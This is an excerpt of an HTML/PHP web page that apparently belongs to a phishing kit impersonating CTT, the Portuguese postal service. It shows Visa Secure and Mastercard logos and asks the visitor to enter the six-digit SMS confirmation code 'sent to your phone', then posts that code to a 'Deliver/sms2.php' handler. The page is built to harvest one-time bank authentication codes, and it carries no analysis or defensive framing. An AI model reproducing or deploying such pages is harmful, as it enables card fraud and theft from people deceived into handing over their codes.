...
<title>CTT | CONFIRMAÇÃO POR SMS</title>
...
<link rel="stylesheet" href="./css/ap.css?t=174920072020" type="text/css">
...
<form action="./Deliver/sms2.php" method="POST">
<div class="title-textxd">
                                                    <h6 class="premss">Confirmação do Código SMS</h6>
</div>



<div class="title-text22">
                                                    <img src="./img/visasecure.png" class="imgvisa">
<img src="./img/logo-mastercard.png" class="imgmaster">
</div>

<br><h4 class="hora">DATA E HORA:&nbsp;&nbsp;&nbsp;<?php echo $currentDateTime; ?></h4>
                                                </div>
                                            </div>
...
<h6 class="vrfy">Para confirmar a operação, insira a chave que enviamos pelo SMS para o seu celular:<br><br></h6>
                            <div class="tracking-wraper">
                        <input class="bigger-input mobile-small" placeholder="Código SMS (XXXXXX)" name="cod2" type="tel" style="border: 1px solid red;" maxlength="6" minlength="6" required="">
...
<div class="caption-button-wrap" data-button-app="">
        <button type="submit" class="button" style="font-size: 14px;">CONFIRMAR</button>
</div>
...
<style type="text/css"></style><style type="text/css"></style><style type="text/css"></style></body></html>